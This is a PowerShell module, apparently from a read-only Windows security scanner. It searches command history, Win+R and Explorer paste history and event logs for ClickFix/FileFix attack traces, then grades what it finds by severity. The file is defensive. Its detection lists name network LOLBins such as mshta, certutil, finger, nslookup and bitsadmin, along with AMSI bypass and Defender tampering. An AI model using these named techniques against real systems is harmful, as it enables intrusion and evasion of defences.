#Requires -Version 7.2
<#
.SYNOPSIS
    S04 - Command history & event logs: ClickFix/FileFix traces, PowerShell logs, BITS, System log
    (services, start types, log clears, shutdowns), MSI installs timeline, Defender, remote sessions,
    firewall rule changes, Shell-Core Run executions, WMI activity, CodeIntegrity, log coverage.
.DESCRIPTION
    READ-ONLY. Reads registry values, history files and event logs; writes only the module envelope
    data\<scanId>\security\S04.json (masked by Complete-BvsRun) and logs\S04.log.

    - History files are never dumped: only suspicious lines (masked, with line number) and counts are kept.
    - Events are parsed by EventData/UserData field NAME from ([xml]$e.ToXml()), never by localized
      message text (the OS may be localized).
    - Our own activity is excluded: only events strictly before AuditStartUtc (scan-meta.json) are used,
      and history lines that reference this project are ignored.
    - Missing or disabled logs become not_applicable (with the reason) rather than errors.
    - Patterns, installer allowlist and vendor update hosts live in S04-history-iocs.json (sidecar).
    - Machine-specific known-good items come from config\local\expected.json via Get-BvsExpected.

    Contract: docs\schema.md  Rules: docs\agent-rules.md  Playbook: docs\playbooks\S04-history-logs.md
.PARAMETER Days
    Event window in days before the audit start (default 90).
.PARAMETER MaxEvents
    Cap for each Get-WinEvent query (default 20000). A check that hits the cap is marked partial.
.EXAMPLE
    pwsh -NoProfile -ExecutionPolicy Bypass -File collectors\security\windows\S04-history-logs.ps1
#>
[CmdletBinding()]
param(
    [ValidateRange(1, 3650)][int]$Days = 90,
    [ValidateRange(100, 500000)][int]$MaxEvents = 20000,
    [switch]$SelfTest
)
$ErrorActionPreference = 'Stop'
Import-Module (Join-Path $PSScriptRoot '..\..\..\lib\windows\BVS.Common.psm1') -Force

$ioc = Get-Content -LiteralPath (Join-Path $PSScriptRoot 'S04-history-iocs.json') -Raw | ConvertFrom-Json
$RxOpts = [Text.RegularExpressions.RegexOptions]'IgnoreCase, CultureInvariant'
$RxTimeout = [TimeSpan]::FromSeconds(2)
$SevRank = @{ info = 0; low = 1; medium = 2; high = 3; critical = 4 }
$SevByRank = @('info', 'low', 'medium', 'high', 'critical')

#region ---------- generic helpers ----------

function ConvertTo-S04Iso { param($Date) if ($null -eq $Date) { return $null }; ([datetime]$Date).ToUniversalTime().ToString('o') }

function Get-S04MaxSeverity {
    param([string[]]$Severities)
    $best = -1
    foreach ($s in $Severities) { if ($s -and $SevRank.ContainsKey($s) -and $SevRank[$s] -gt $best) { $best = $SevRank[$s] } }
    if ($best -lt 0) { return $null }
    $SevByRank[$best]
}

function Limit-S04Severity {
    param([string]$Severity, [string]$Cap)
    if (-not $Cap -or -not $Severity) { return $Severity }
    if ($SevRank[$Severity] -gt $SevRank[$Cap]) { return $Cap }
    $Severity
}

$UrlRx = [regex]::new('\b(?:https?|ftp)://[^\s''"`<>|;(){}\[\]]+', $RxOpts, $RxTimeout)
$CurlUserRx = [regex]::new('((?:^|\s)(?:-u|--user|--proxy-user|-U)\s+["'']?[^:\s"'']+:)[^\s"'']+', $RxOpts, $RxTimeout)
$AuthHeaderRx = [regex]::new('(Authorization["'']?\s*[:=]\s*["'']?(?:Bearer|Basic|token|Digest|Negotiate|Bot)?\s*)[^\s"'';}]+', $RxOpts, $RxTimeout)

function Protect-S04Line {
    <# Mask a kept line: strip URL query strings (Protect-BvsUrl), mask curl -u passwords and Authorization
       header values, then Protect-BvsText; truncate. #>
    param([AllowNull()][AllowEmptyString()][string]$Text, [int]$Max = 500)
    if ([string]::IsNullOrEmpty($Text)) { return $Text }
    $t = $Text -replace "[`r`n]+", ' '
    try {
        $t = $UrlRx.Replace($t, [Text.RegularExpressions.MatchEvaluator] { param($m) Protect-BvsUrl $m.Value })
        $t = $CurlUserRx.Replace($t, '$1[REDACTED]')
        $t = $AuthHeaderRx.Replace($t, '$1[REDACTED]')
    }
    catch { return '[REDACTED:mask-timeout]' }
    $t = Protect-BvsText $t
    if ($t.Length -gt $Max) { $t = $t.Substring(0, $Max) + '...[truncated]' }
    $t
}

function Get-S04EventData {
    <# EventData/UserData fields by NAME from ([xml]$e.ToXml()). Unnamed <Data> become Data0..n; <Binary> -> Binary. #>
    param([Parameter(Mandatory)]$EventRecord)
    $h = [ordered]@{}
    $x = [xml]$EventRecord.ToXml()
    $ed = $x.Event.EventData
    if ($ed -is [Xml.XmlElement]) {
        $i = 0
        foreach ($n in $ed.ChildNodes) {
            if ($n -isnot [Xml.XmlElement]) { continue }
            if ($n.LocalName -eq 'Binary') { $h['Binary'] = $n.InnerText; continue }
            $name = $n.GetAttribute('Name')
            if ([string]::IsNullOrEmpty($name)) { $name = "Data$i" }
            $h[$name] = $n.InnerText
            $i++
        }
    }
    $ud = $x.Event.UserData
    if ($ud -is [Xml.XmlElement]) {
        foreach ($c in $ud.ChildNodes) {
            if ($c -isnot [Xml.XmlElement]) { continue }
            $h['_UserDataType'] = $c.LocalName
            foreach ($cc in $c.ChildNodes) { if ($cc -is [Xml.XmlElement]) { $h[$cc.LocalName] = $cc.InnerText } }
        }
    }
    $h
}

$script:Coverage = [ordered]@{}

function Get-S04LogCoverage {
    <# Record count, size, oldest/newest event, enabled state and window coverage of one log (cached). #>
    param([Parameter(Mandatory)][string]$LogName)
    if ($script:Coverage.Contains($LogName)) { return $script:Coverage[$LogName] }
    $c = [ordered]@{
        log = $LogName; exists = $false; enabled = $null; readable = $false; status = 'missing'
        recordCount = $null; fileSizeBytes = $null; maxSizeBytes = $null; logMode = $null; isFull = $null
        oldestUtc = $null; newestUtc = $null; preAuditDays = $null; coversWindow = $false; windowDays = $Days
        postAuditEvents = 0; eventsUsed = 0; queriedIds = @(); note = $null
    }
    $script:Coverage[$LogName] = $c
    try { $li = Get-WinEvent -ListLog $LogName -ErrorAction Stop }
    catch {
        $msg = $_.Exception.Message
        if ($_.Exception -is [UnauthorizedAccessException] -or $msg -match '(?i)elevated|unauthorized|access is denied') {
            $c.exists = $true; $c.status = 'needs_admin'; $c.note = 'not readable without elevation'
        }
        else { $c.note = 'log does not exist on this system' }
        return $c
    }
    $c.exists = $true
    $c.enabled = [bool]$li.IsEnabled
    $c.recordCount = $li.RecordCount
    $c.fileSizeBytes = $li.FileSize
    $c.maxSizeBytes = $li.MaximumSizeInBytes
    $c.logMode = [string]$li.LogMode
    if ($li.FileSize -and $li.MaximumSizeInBytes) { $c.isFull = [bool]($li.FileSize -ge (0.95 * $li.MaximumSizeInBytes)) }
    $oldest = $null; $newest = $null
    try { $oldest = (Get-WinEvent -LogName $LogName -Oldest -MaxEvents 1 -ErrorAction Stop).TimeCreated.ToUniversalTime() } catch { }
    try { $newest = (Get-WinEvent -LogName $LogName -MaxEvents 1 -ErrorAction Stop).TimeCreated.ToUniversalTime() } catch { }
    $c.oldestUtc = $oldest; $c.newestUtc = $newest
    $c.readable = ($null -ne $oldest) -or (-not $c.recordCount)
    if ($newest -and $newest -ge $AuditUtc) {
        try { $c.postAuditEvents = @(Get-WinEvent -FilterHashtable @{ LogName = $LogName; StartTime = $AuditUtc } -MaxEvents 50000 -ErrorAction Stop).Count } catch { }
    }
    if (-not $c.enabled) { $c.status = 'disabled' }
    elseif (-not $oldest) { $c.status = 'empty' }
    elseif ($oldest -ge $AuditUtc) { $c.status = 'overwritten_by_audit' }
    else { $c.status = 'ok' }
    if ($oldest -and $oldest -lt $AuditUtc) {
        $c.preAuditDays = [math]::Round(($AuditUtc - $oldest).TotalDays, 1)
        $c.coversWindow = [bool]($oldest -le $WindowStartUtc)
    }
    $c
}

function Get-S04Events {
    <# Get-WinEvent -FilterHashtable wrapper: strictly before AuditStartUtc, empty result instead of
       'no events' errors, typed error for missing logs. Returns Events + Capped. #>
    param(
        [Parameter(Mandatory)][string]$LogName,
        [int[]]$Id,
        [string]$Provider,
        [Nullable[datetime]]$StartUtc,
        [int]$Max = $MaxEvents
    )
    $cov = Get-S04LogCoverage -LogName $LogName
    if ($Id) { $cov.queriedIds = @(@($cov.queriedIds) + $Id | Sort-Object -Unique) }
    $fh = @{ LogName = $LogName; EndTime = $AuditUtc }
    if ($Id) { $fh.Id = $Id }
    if ($Provider) { $fh.ProviderName = $Provider }
    if ($null -ne $StartUtc) { $fh.StartTime = [datetime]$StartUtc }   # PowerShell unwraps Nullable[datetime]: no .Value
    $ev = @()
    try { $ev = @(Get-WinEvent -FilterHashtable $fh -MaxEvents $Max -ErrorAction Stop) }
    catch {
        $fq = [string]$_.FullyQualifiedErrorId
        if ($fq -match 'NoMatchingEventsFound' -or $_.Exception.Message -match '(?i)no events were found') { $ev = @() }
        elseif ($fq -match 'NoMatchingLogsFound') { $ev = @() }
        else { throw }
    }
    $capped = $ev.Count -ge $Max
    $ev = @($ev | Where-Object { $_.TimeCreated -and $_.TimeCreated.ToUniversalTime() -lt $AuditUtc })
    $cov.eventsUsed += $ev.Count
    [pscustomobject]@{ Events = $ev; Capped = $capped }
}

function Set-S04CoverageStatus {
    <# Shared check-status logic for event-log checks: not_applicable for missing/disabled/empty logs,
       partial when retention does not cover the window or a cap was hit. #>
    param([string]$CheckId, [string[]]$Logs, [bool]$Capped = $false)
    $notes = [System.Collections.Generic.List[string]]::new()
    $states = @()
    foreach ($l in $Logs) {
        $c = Get-S04LogCoverage -LogName $l
        $states += $c.status
        $short = $l -replace '^Microsoft-Windows-', ''
        switch ($c.status) {
            'missing' { $notes.Add("$short missing") }
            'disabled' { $notes.Add("$short disabled") }
            'needs_admin' { $notes.Add("$short needs elevation") }
            'overwritten_by_audit' { $notes.Add("$short holds only post-audit events (pre-audit history overwritten)") }
            'ok' { if (-not $c.coversWindow) { $notes.Add(('{0} only covers since {1:yyyy-MM-dd} ({2} of {3} days)' -f $short, $c.oldestUtc, $c.preAuditDays, $Days)) } }
        }
    }
    if ($Capped) { $notes.Add("MaxEvents cap ($MaxEvents) reached") }
    # An empty but enabled log is a valid observation ("nothing happened"), not a coverage gap.
    $usable = @($states | Where-Object { $_ -in 'ok', 'overwritten_by_audit', 'empty' })
    if ($usable.Count -eq 0) {
        if (@($states | Where-Object { $_ -eq 'needs_admin' }).Count -eq $states.Count) { Set-BvsCheckStatus -Id $CheckId -Status needs_admin -Reason ($notes -join '; ') }
        else { Set-BvsCheckStatus -Id $CheckId -Status not_applicable -Reason ($notes -join '; ') }
    }
    elseif ($notes.Count -gt 0) { Set-BvsCheckStatus -Id $CheckId -Status partial -Reason ($notes -join '; ') }
}

$OwnRx = [regex]::new(([regex]::Escape((Get-BvsRoot)) + '|baby-virus-scanner|\bBVS\.Common\b|\bInitialize-BvsRun\b|\bProtect-BvsText\b|\bComplete-BvsRun\b'), $RxOpts, $RxTimeout)

function Get-S04ExpectedPathMatch {
    <# expected.json 'path' items (e.g. security-tool folders the user listed) referenced in a text. #>
    param([string]$Text)
    foreach ($item in (Get-BvsExpected -Category path)) {
        if ($item.id -eq 'this-project') { continue }
        foreach ($p in @($item.match.paths)) {
            if (-not $p) { continue }
            $ep = [Environment]::ExpandEnvironmentVariables([string]$p)
            if ($Text.IndexOf($ep, [StringComparison]::OrdinalIgnoreCase) -ge 0 -or $Text.IndexOf((Split-Path -Leaf $ep), [StringComparison]::OrdinalIgnoreCase) -ge 0) {
                return [ordered]@{ id = $item.id; reason = $item.reason; class = $item.class }
            }
        }
    }
    $null
}

function Get-S04ExpectedItem { param([string]$Id) Get-BvsExpected | Where-Object { $_.id -eq $Id } | Select-Object -First 1 }

#endregion

#region ---------- command-line classification (shared by history, RunMRU, PowerShell logs, Shell-Core) ----------

$Patterns = foreach ($p in $ioc.commandPatterns) {
    [pscustomobject]@{
        Id          = [string]$p.id
        Category    = [string]$p.category
        Weight      = [int]$p.weight
        Mitre       = @($p.mitre)
        Description = [string]$p.description
        Rx          = [regex]::new([string]$p.regex, $RxOpts, $RxTimeout)
        Requires    = if ($p.requires) { [regex]::new([string]$p.requires, $RxOpts, $RxTimeout) } else { $null }
    }
}
$PatternById = @{}; foreach ($p in $Patterns) { $PatternById[$p.Id] = $p }
# One combined regex as a cheap prefilter: most lines/script blocks match nothing and skip the per-pattern loop.
$AnyRx = [regex]::new((($Patterns | ForEach-Object { '(?:' + $_.Rx.ToString() + ')' }) -join '|'), $RxOpts, [TimeSpan]::FromSeconds(5))
$NetLolbinIds = @('mshta_url', 'msiexec_url', 'certutil_urlcache', 'finger', 'rundll32_unc', 'webdav_unc', 'nslookup_stage', 'bitsadmin', 'conhost_headless')
$AlwaysHighIds = @('nslookup_stage', 'finger', 'conhost_headless', 'webdav_unc', 'rundll32_unc', 'mshta_url')
$LureIds = @('captcha_lure', 'verification_comment', 'whitespace_padding')
$EncodedArgRx = [regex]::new('(?:^|\s)[-/]e(?:c|n[a-z]*)?\s+["'']?([A-Za-z0-9+/]{20,}={0,2})', $RxOpts, $RxTimeout)
$DownloadVerbRx = [regex]::new('(?<![\w-])(?:' + ((@($ioc.downloadVerbs) | ForEach-Object { [regex]::Escape($_) }) -join '|') + ')(?![\w.-])', $RxOpts, $RxTimeout)
$TokenRx = [regex]::new('"[^"]*"|''[^'']*''|@\{[^}]*\}|[^\s|;]+', $RxOpts, $RxTimeout)
$BareHostRx = [regex]::new('^(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z][a-z0-9-]{1,23}(?::\d{1,5})?(?:/\S*)?$', $RxOpts, $RxTimeout)
$DlCallRx = [regex]::new('\.Download(?:String|File|Data)(?:Async|TaskAsync)?\s*\(\s*["'']([^"'']+)["'']', $RxOpts, $RxTimeout)
$UncHostRx = [regex]::new('\\\\([A-Za-z0-9][A-Za-z0-9.\-]*)(?:@SSL)?(?:@\d+)?\\', $RxOpts, $RxTimeout)
$FingerHostRx = [regex]::new('\bfinger(?:\.exe)?\s+[^\s|;]*@([^\s|;''"]+)', $RxOpts, $RxTimeout)
$ValueParams = [System.Collections.Generic.HashSet[string]]::new([string[]]@($ioc.downloadValueParams), [StringComparer]::OrdinalIgnoreCase)
$UrlParams = [System.Collections.Generic.HashSet[string]]::new([string[]]@($ioc.downloadUrlParams), [StringComparer]::OrdinalIgnoreCase)
$GithubHosts = [System.Collections.Generic.HashSet[string]]::new([string[]]@($ioc.githubHosts), [StringComparer]::OrdinalIgnoreCase)
$GithubOwners = [System.Collections.Generic.HashSet[string]]::new([string[]]@($ioc.githubKnownOwners), [StringComparer]::OrdinalIgnoreCase)

function Test-S04PrivateIp {
    param([Net.IPAddress]$Ip)
    if ([Net.IPAddress]::IsLoopback($Ip)) { return $true }
    if ($Ip.AddressFamily -eq [Net.Sockets.AddressFamily]::InterNetworkV6) { return ($Ip.IsIPv6LinkLocal -or $Ip.IsIPv6SiteLocal -or $Ip.ToString() -match '^f[cd]') }
    $b = $Ip.GetAddressBytes()
    ($b[0] -eq 10) -or ($b[0] -eq 192 -and $b[1] -eq 168) -or ($b[0] -eq 172 -and $b[1] -ge 16 -and $b[1] -le 31) -or
    ($b[0] -eq 169 -and $b[1] -eq 254) -or ($b[0] -eq 100 -and $b[1] -ge 64 -and $b[1] -le 127) -or ($b[0] -eq 127)
}

function Get-S04HostClass {
    <# allowlisted | github-known | github-unknown | local | unknown-ip | unknown #>
    param([string]$HostName, [string]$Path)
    $h = $HostName.ToLowerInvariant().TrimEnd('.').Trim('[', ']')
    $r = [ordered]@{ class = 'unknown'; domain = $null; owner = $null }
    if ($h -eq 'localhost' -or $h -match '\.(?:localhost|local|internal|lan|home\.arpa)$' -or $h -notmatch '\.') { $r.class = 'local'; return $r }
    $ip = $null
    if ([Net.IPAddress]::TryParse($h, [ref]$ip)) { $r.class = if (Test-S04PrivateIp $ip) { 'local' } else { 'unknown-ip' }; return $r }
    foreach ($d in $ioc.installerDomains) {
        if ($h -eq $d -or $h.EndsWith('.' + $d)) { $r.class = 'allowlisted'; $r.domain = $d; return $r }
    }
    if ($GithubHosts.Contains($h)) {
        $seg = @(([string]$Path).Trim('/') -split '/' | Where-Object { $_ })
        $owner = $null
        if ($h -eq 'api.github.com') { if ($seg.Count -ge 2 -and $seg[0] -eq 'repos') { $owner = $seg[1] } }
        elseif ($h -notmatch '^(?:objects|release-assets)\.githubusercontent\.com$' -and $seg.Count -ge 1) { $owner = $seg[0] }
        $r.domain = $h; $r.owner = $owner
        $r.class = if ($owner -and $GithubOwners.Contains($owner)) { 'github-known' } else { 'github-unknown' }
        return $r
    }
    $r
}

function Add-S04Target {
    <# Parse one target candidate (URL, bare host[/path], UNC host, $variable) and add it to $Out once. #>
    param([System.Collections.Specialized.OrderedDictionary]$Out, [string]$Candidate, [string]$Kind)
    $c = $Candidate.Trim().Trim('"', "'", '(', ')', '[', ']', '{', '}', ',', '`')
    if (-not $c) { return }
    if ($c.StartsWith('$')) { $Out['$var'] = [ordered]@{ host = $null; url = $null; class = 'variable'; domain = $null; owner = $null; kind = 'variable' }; return }
    $u = $null
    if ($c -match '^(?:https?|ftp)://') { [void][uri]::TryCreate($c, [UriKind]::Absolute, [ref]$u) }
    elseif ($Kind -eq 'host') { [void][uri]::TryCreate("https://$c/", [UriKind]::Absolute, [ref]$u) }
    elseif ($BareHostRx.IsMatch($c)) { [void][uri]::TryCreate("https://$c", [UriKind]::Absolute, [ref]$u) }
    if (-not $u -or -not $u.Host) { return }
    $key = $u.Host.ToLowerInvariant() + $u.AbsolutePath.ToLowerInvariant()
    if ($Out.Contains($key)) { return }
    $cls = Get-S04HostClass -HostName $u.Host -Path $u.AbsolutePath
    $Out[$key] = [ordered]@{ host = $u.Host.ToLowerInvariant(); url = (Protect-BvsUrl ($u.GetLeftPart([UriPartial]::Path))); class = $cls.class; domain = $cls.domain; owner = $cls.owner; kind = $Kind }
}

function Get-S04Targets {
    <# Network targets of a command line: explicit URLs, bare hosts after download verbs (irm get.scoop.sh),
       Download*('url'), UNC/WebDAV hosts, finger hosts; '$var' URLs are reported as unresolved. #>
    param([string]$Text)
    $out = [ordered]@{}
    try {
        foreach ($m in $UrlRx.Matches($Text)) { Add-S04Target -Out $out -Candidate $m.Value -Kind 'url' }
        foreach ($m in $DlCallRx.Matches($Text)) { Add-S04Target -Out $out -Candidate $m.Groups[1].Value -Kind 'url' }
        foreach ($m in $UncHostRx.Matches($Text)) { Add-S04Target -Out $out -Candidate $m.Groups[1].Value -Kind 'host' }
        foreach ($m in $FingerHostRx.Matches($Text)) { Add-S04Target -Out $out -Candidate $m.Groups[1].Value -Kind 'host' }
        foreach ($m in $DownloadVerbRx.Matches($Text)) {
            # First positional argument of the download verb, up to the next pipe/semicolon (approximate).
            $rest = $Text.Substring($m.Index + $m.Length)
            $cut = $rest.IndexOfAny([char[]]'|;')
            if ($cut -ge 0) { $rest = $rest.Substring(0, $cut) }
            $skipNext = $false; $takeNext = $false
            foreach ($tm in $TokenRx.Matches($rest)) {
                $tk = $tm.Value
                if ($takeNext) { Add-S04Target -Out $out -Candidate $tk -Kind 'url'; break }
                if ($skipNext) { $skipNext = $false; continue }
                if ($tk.StartsWith('-')) {
                    $name = ($tk -split '[:=]', 2)[0]
                    if ($UrlParams.Contains($name)) { if ($tk -match '[:=](.+)$') { Add-S04Target -Out $out -Candidate $Matches[1] -Kind 'url'; break } else { $takeNext = $true } }
                    elseif ($ValueParams.Contains($name)) { $skipNext = $true }
                    continue
                }
                if ($tk.StartsWith('@{')) { continue }
                Add-S04Target -Out $out -Candidate $tk -Kind 'bare'
                break
            }
        }
    }
    catch [System.Text.RegularExpressions.RegexMatchTimeoutException] { }
    @($out.Values)
}

function Get-S04DecodedCommand {
    param([string]$Text)
    try { $m = $EncodedArgRx.Match($Text) } catch { return $null }
    if (-not $m.Success) { return $null }
    $b64 = $m.Groups[1].Value
    $b64 = $b64.Substring(0, $b64.Length - ($b64.Length % 4))
    try { $bytes = [Convert]::FromBase64String($b64) } catch { return $null }
    foreach ($enc in @([Text.Encoding]::Unicode, [Text.Encoding]::UTF8)) {
        $s = $enc.GetString($bytes)
        $printable = ($s.ToCharArray() | Where-Object { [int]$_ -ge 32 -or $_ -in "`t", "`r", "`n" }).Count
        if ($s.Length -gt 0 -and ($printable / $s.Length) -ge 0.9) { return $s }
    }
    $null
}

function Test-S04Patterns {
    param([string]$Text)
    $hits = [System.Collections.Generic.List[object]]::new()
    if ([string]::IsNullOrWhiteSpace($Text)) { return , $hits }
    $t = if ($Text.Length -gt 20000) { $Text.Substring(0, 20000) } else { $Text }
    try { if (-not $AnyRx.IsMatch($t)) { return , $hits } } catch [System.Text.RegularExpressions.RegexMatchTimeoutException] { }
    foreach ($p in $Patterns) {
        try {
            $m = $p.Rx.Match($t)
            if ($m.Success -and (-not $p.Requires -or $p.Requires.IsMatch($t))) { $hits.Add($p) }
        }
        catch [System.Text.RegularExpressions.RegexMatchTimeoutException] { }
    }
    , $hits
}

function Get-S04Classification {
    <#
    Classify one command line. Returns $null when no pattern matches; otherwise a record whose Severity is
    $null for weak-only hits (counted, no finding). Rules:
      download-and-execute / URL LOLBins -> by target: unknown host or public IP = high, unreviewed GitHub
        owner or unresolved ($var) URL = medium, local/LAN = low, allowlisted installer domains = info;
        a captcha/FileFix lure on the same line makes it high.
      other strong hits (encoded, AMSI, Defender tampering, lure, packed payload) -> medium, or high in
        combination (encoded+hidden, lure+execution, tamper+hidden/encoded/download, AMSI, conhost --headless).
      medium-weight hits (persistence, offensive tooling, obfuscation, misc LOLBins) -> low.
    #>
    param([string]$Text, [string]$Vector)
    $hits = Test-S04Patterns $Text
    $decoded = $null; $decodedBenign = $false; $urlOpener = $null
    if (@($hits | Where-Object Category -eq 'encoded_command').Count -gt 0) {
        $decoded = Get-S04DecodedCommand $Text
        if ($decoded) {
            $decHits = Test-S04Patterns $decoded
            foreach ($h in $decHits) { if (-not ($hits | Where-Object Id -eq $h.Id)) { $hits.Add($h) } }
            $decodedBenign = @($decHits | Where-Object { $_.Weight -ge 2 }).Count -eq 0
            # Decoded command that only opens a URL in the default browser (Node's 'open' package does this for CLI logins).
            $om = [regex]::Match($decoded, '^\s*(?:Start(?:-Process)?|explorer(?:\.exe)?)\s+["'']?(https?://[^\s"'']+)["'']?\s*;?\s*$', $RxOpts)
            if ($om.Success) { $urlOpener = $om.Groups[1].Value }
        }
    }
    if ($hits.Count -eq 0) { return $null }
    $ids = @($hits | ForEach-Object Id)
    $cats = @($hits | ForEach-Object Category | Sort-Object -Unique)
    $targets = @(Get-S04Targets ($Text + $(if ($decoded) { "`n" + $decoded } else { '' })))
    $classes = @($targets | ForEach-Object { $_.class })
    $netStrong = ($cats -contains 'download_exec') -or (@($ids | Where-Object { $_ -in $NetLolbinIds }).Count -gt 0)
    $hasLure = @($ids | Where-Object { $_ -in $LureIds }).Count -gt 0
    $hasExec = ($ids -contains 'iex') -or ($cats -contains 'download_exec') -or ($cats -contains 'lolbin') -or ($cats -contains 'encoded_command') -or ($ids -contains 'hidden_window') -or ($ids -contains 'download_api')
    $sev = $null; $key = $null
    $reasons = [System.Collections.Generic.List[string]]::new()
    if ($netStrong) {
        $reasons.Add('download_exec')
        if ($classes -contains 'unknown' -or $classes -contains 'unknown-ip') {
            $sev = 'high'; $t0 = $targets | Where-Object { $_.class -in 'unknown', 'unknown-ip' } | Select-Object -First 1
            $key = "net|unknown|$($t0.host)"; $reasons.Add('unknown_domain')
        }
        elseif ($classes -contains 'github-unknown') {
            $sev = 'medium'; $t0 = $targets | Where-Object { $_.class -eq 'github-unknown' } | Select-Object -First 1
            $key = "net|github|$(if ($t0.owner) { $t0.owner } else { $t0.host })"; $reasons.Add('unreviewed_github_owner')
        }
        elseif ($targets.Count -eq 0 -or $classes -contains 'variable') { $sev = 'medium'; $key = 'net|unresolved'; $reasons.Add('unresolved_url') }
        elseif ($classes -contains 'local') { $sev = 'low'; $key = 'net|local' }
        else { $sev = 'info'; $key = 'net|allowlisted'; $reasons.Add('allowlisted_installer') }
        if ($hasLure -and $SevRank[$sev] -lt 3) { $sev = 'high'; $key = "line|$Vector|$('{0:x8}' -f $Text.GetHashCode())"; $reasons.Add('clickfix_lure') }
        # LOLBins that have no place in a developer's normal workflow: high unless every target is local.
        $allLocal = ($targets.Count -gt 0) -and (@($targets | Where-Object { $_.class -ne 'local' }).Count -eq 0)
        if (@($ids | Where-Object { $_ -in $AlwaysHighIds }).Count -gt 0 -and -not $allLocal -and $SevRank[$sev] -lt 3) { $sev = 'high'; $key = "line|$Vector|$('{0:x8}' -f $Text.GetHashCode())"; $reasons.Add('clickfix_lolbin') }
        if ($sev -eq 'info' -and ($cats -contains 'encoded_command' -or $ids -contains 'hidden_window')) { $sev = 'low'; $key = 'net|allowlisted-hidden' }
    }
    else {
        $strong = @($hits | Where-Object { $_.Weight -ge 3 })
        $medium = @($hits | Where-Object { $_.Weight -eq 2 })
        $strongOther = @($strong | Where-Object { $_.Category -ne 'encoded_command' })
        if ($urlOpener -and $strongOther.Count -eq 0) {
            $uo = $null; [void][uri]::TryCreate($urlOpener, [UriKind]::Absolute, [ref]$uo)
            $sev = 'info'; $key = "encurl|$Vector|$(if ($uo) { $uo.Host } else { 'url' })"; $reasons.Add('decoded_url_opener')
        }
        elseif ($decoded -and $decodedBenign -and $strongOther.Count -eq 0) {
            # Decoded content shows no download/obfuscation/tampering: low, or medium when also run hidden.
            if ($ids -contains 'hidden_window') { $sev = 'medium'; $key = "encbenign|$Vector|hidden" } else { $sev = 'low'; $key = "encbenign|$Vector" }
            $reasons.Add('decoded_benign')
        }
        elseif ($strong.Count -gt 0) {
            $sev = 'medium'
            $enc = $cats -contains 'encoded_command'
            $hidden = $ids -contains 'hidden_window'
            if ($ids -contains 'amsi_bypass' -or $ids -contains 'compressed_payload' -or $ids -contains 'conhost_headless') { $sev = 'high' }
            elseif ($enc -and ($hidden -or $ids -contains 'iex' -or $ids -contains 'download_api' -or $ids -contains 'frombase64')) { $sev = 'high' }
            elseif ($hasLure -and $hasExec) { $sev = 'high'; $reasons.Add('clickfix_lure') }
            elseif ($ids -contains 'defender_tamper' -and ($hidden -or $enc -or $ids -contains 'download_api')) { $sev = 'high' }
            $key = "line|$Vector|$('{0:x8}' -f $Text.GetHashCode())"
        }
        elseif ($medium.Count -gt 0) {
            $sev = 'low'
            $key = "cat|$Vector|$(($medium | Sort-Object Category | Select-Object -First 1).Category)"
        }
    }
    if ($cats -contains 'encoded_command') { $reasons.Add('encoded_command') }
    if ($ids -contains 'hidden_window' -or $ids -contains 'conhost_headless') { $reasons.Add('hidden') }
    if ($cats -contains 'obfuscation') { $reasons.Add('obfuscation') }
    if ($cats -contains 'lolbin') { $reasons.Add('lolbin') }
    if ($cats -contains 'defense_evasion') { $reasons.Add('defense_evasion') }
    if ($cats -contains 'persistence') { $reasons.Add('persistence') }
    if ($hasLure) { $reasons.Add('lure_text') }
    [pscustomobject]@{
        Severity   = $sev
        GroupKey   = $key
        Hits       = $ids
        Categories = $cats
        MaxWeight  = ($hits | Measure-Object Weight -Maximum).Maximum
        Targets    = $targets
        Decoded    = $decoded
        Reasons    = @($reasons | Sort-Object -Unique)
        Mitre      = @($hits | ForEach-Object { $_.Mitre } | Sort-Object -Unique)
        Primary    = ($hits | Sort-Object Weight -Descending | Select-Object -First 1)
    }
}

function New-S04CommandRecord {
    param($Classification, [string]$Vector, [string]$Source, [string]$SourcePath, [Nullable[int]]$Line, [string]$Locator, $TimeUtc, [string]$Text, [int]$Count = 1, $Expected = $null)
    [pscustomobject][ordered]@{
        vector     = $Vector
        source     = $Source
        sourcePath = $SourcePath
        line       = $Line
        locator    = $Locator
        timeUtc    = (ConvertTo-S04Iso $TimeUtc)
        count      = $Count
        text       = (Protect-S04Line $Text)
        decoded    = $(if ($Classification.Decoded) { Protect-S04Line $Classification.Decoded 400 } else { $null })
        patterns   = @($Classification.Hits)
        categories = @($Classification.Categories)
        targets    = @($Classification.Targets)
        severity   = $Classification.Severity
        groupKey   = $Classification.GroupKey
        reasons    = @($Classification.Reasons)
        mitre      = @($Classification.Mitre)
        expected   = $Expected
        primary    = $Classification.Primary.Description
    }
}

$VectorLabel = @{
    history     = 'command history files'
    runmru      = 'Win+R history (RunMRU, the ClickFix paste target)'
    typedpaths  = 'Explorer address bar (TypedPaths, the FileFix paste target)'
    pshost      = 'PowerShell host command lines (Windows PowerShell log 400/403/600)'
    scriptblock = 'PowerShell script-block log (4104)'
    pipeline    = 'PowerShell pipeline log (4103)'
    runkey      = 'Run/RunOnce executions (Shell-Core 9707)'
}

function Add-S04CommandFindings {
    <# Turn classified records into findings, grouped so one unknown domain / GitHub owner / category =
       one finding; strong single-line indicators stay individual. #>
    param([object[]]$Records, [string]$Check)
    $recs = @($Records | Where-Object { $_.severity })
    foreach ($g in ($recs | Group-Object groupKey)) {
        $items = @($g.Group)
        $first = $items[0]
        $vector = $first.vector
        $label = $VectorLabel[$vector]
        $sev = Get-S04MaxSeverity @($items | ForEach-Object severity)
        $parts = $g.Name -split '\|', 3
        $hostsAll = @($items | ForEach-Object { $_.targets } | Where-Object { $_ -and $_.host })
        $net = @($hostsAll | Group-Object { $_.host } | ForEach-Object { [ordered]@{ host = $_.Name; class = $_.Group[0].class; owner = $_.Group[0].owner; urls = @($_.Group | ForEach-Object url | Sort-Object -Unique | Select-Object -First 5) } })
        $evidence = @($items | Sort-Object { $SevRank[$_.severity] } -Descending | Select-Object -First 12 | ForEach-Object {
                [ordered]@{ type = $(if ($_.vector -in 'runmru', 'typedpaths') { 'registry' } elseif ($_.vector -eq 'history') { 'history' } else { 'event' })
                    source = $_.source; path = $_.sourcePath; line = $_.line; locator = $_.locator; time = $_.timeUtc; count = $_.count
                    text = $_.text; decoded = $_.decoded; patterns = $_.patterns; hosts = @($_.targets | ForEach-Object { $_.host } | Where-Object { $_ }) }
            })
        $reasons = @($items | ForEach-Object { $_.reasons } | Sort-Object -Unique)
        $mitre = @(@($items | ForEach-Object { $_.mitre }) + $(if ($vector -in 'runmru', 'typedpaths') { 'T1204.004' }) | Where-Object { $_ } | Sort-Object -Unique)
